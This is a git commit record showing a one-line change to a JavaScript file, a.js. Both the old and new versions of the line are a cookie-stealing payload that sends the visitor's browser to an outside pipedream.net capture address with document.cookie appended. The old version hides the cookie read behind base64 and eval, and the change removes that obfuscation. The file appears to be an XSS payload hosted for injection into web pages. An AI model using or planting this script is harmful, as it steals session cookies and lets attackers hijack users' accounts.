96b4a6c1baf726cc2d9d686d525a4bb3c0980175
kixisaleesd <103558212+kixisaleesd@users.noreply.github.com>
2022-05-09 17:12:31 +0200

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,1 @@
-document.location.href="//eoxayhutwq6its6.m.pipedream.net?".concat(eval(atob('ZG9jdW1lbnQuY29va2ll')));
+document.location.href="//eoxayhutwq6its6.m.pipedream.net?".concat(document.cookie);
